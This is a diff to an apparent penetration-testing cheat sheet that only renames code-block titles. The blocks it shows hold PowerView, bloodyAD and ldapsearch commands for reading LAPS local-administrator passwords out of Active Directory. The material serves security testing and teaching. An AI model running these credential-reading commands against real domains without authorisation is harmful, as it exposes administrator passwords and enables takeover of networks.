@@ -70,7 +70,7 @@ var user
 
 Read `ms-Mcs-AdmPwd` directly via PowerView (legacy LAPS). For Windows LAPS, query `msLAPS-Password` or `msLAPS-EncryptedPassword` instead.
 
-```powershell title:"Read ms-Mcs-AdmPwd from a computer object via PowerView"
+```powershell title:"LAPS Read ms-Mcs-AdmPwd from a computer object via PowerView"
 Get-DomainObject $rhost_name -Properties "ms-mcs-AdmPwd",name
 ```
 <!-- cheat
@@ -81,7 +81,7 @@ var rhost_name
 
 Read the LAPS password attribute over LDAP from Linux via bloodyAD.
 
-```sh title:"Read ms-Mcs-AdmPwd over LDAP via bloodyAD"
+```sh title:"LAPS Read ms-Mcs-AdmPwd over LDAP via bloodyAD"
 bloodyAD --host $rhost_name -d $domain -u $user $auth_flags get object $target_computer --attr ms-Mcs-AdmPwd
 ```
 <!-- cheat
@@ -96,7 +96,7 @@ var target_computer
 
 Raw LDAP query for hosts where `ms-Mcs-AdmPwd` is readable. Useful when canned tools aren't available.
 
-```sh title:"Raw LDAP search for readable ms-Mcs-AdmPwd values"
+```sh title:"LAPS Raw LDAP search for readable ms-Mcs-AdmPwd values"
 ldapsearch -x -H ldap://$rhost_ip -D "$user@$domain" -w $pass -b "$base_dn" "(ms-Mcs-AdmPwd=*)" ms-Mcs-AdmPwd sAMAccountName
 ```
 <!-- cheat
